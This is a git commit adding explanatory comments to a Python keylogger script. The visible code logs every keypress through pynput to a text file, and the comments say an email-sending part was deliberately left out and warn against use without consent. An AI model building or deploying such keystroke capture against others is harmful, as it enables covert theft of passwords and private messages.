0cbba3a888efd15ba216f5f6b9102cf36c25af08
lalarcon-py <74345096+lalarcon-py@users.noreply.github.com>
2020-12-25 20:28:39 -0800

    Update Keylogger.py
    Included 3 new comment lines to describe certain portions of the program.

--- Keylogger.py
+++ Keylogger.py
@@ -9,3 +9,6 @@ def key_handler(key):
     logging.info(key)
 with Listener(on_press=key_handler) as listener:
     listener.join()
+## pynput has a submodule named Listener, listener allows the program to record and trace keystrokes albeit individually.
+## This program creates a text file named mylog.txt, if you so wanted to change the file name refer to line 7 and simply change the mylog.txt to whatever your hear desires.
+## For the sake of protecting other users I have left out the auto mail client portion of this program, please do not use this program for malicious purposes or without the 3rd party's explicit consent!!
